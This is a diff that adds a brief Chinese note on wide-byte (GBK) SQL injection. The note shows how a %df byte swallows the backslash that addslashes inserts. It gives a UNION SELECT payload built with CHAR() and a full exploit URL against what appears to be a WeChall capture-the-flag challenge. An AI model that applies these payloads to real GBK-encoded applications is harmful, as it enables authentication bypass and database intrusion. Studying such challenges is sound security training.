@@ -1,0 +1,9 @@
+宽字节注入：
+
+%C0 %df %bf
+
+%df%27 ----addslashed---->%df%5c%27----GBK---->運'
+
+%C0'+union+select+CHAR(65,100,109,105,110)#
+
+https://www.wechall.net/challenge/addslashes/index.php?username=%df%27+union+select+CHAR%2865%2C100%2C109%2C105%2C110%29%23&password=1234&login=%E6%B3%A8%E5%86%8C
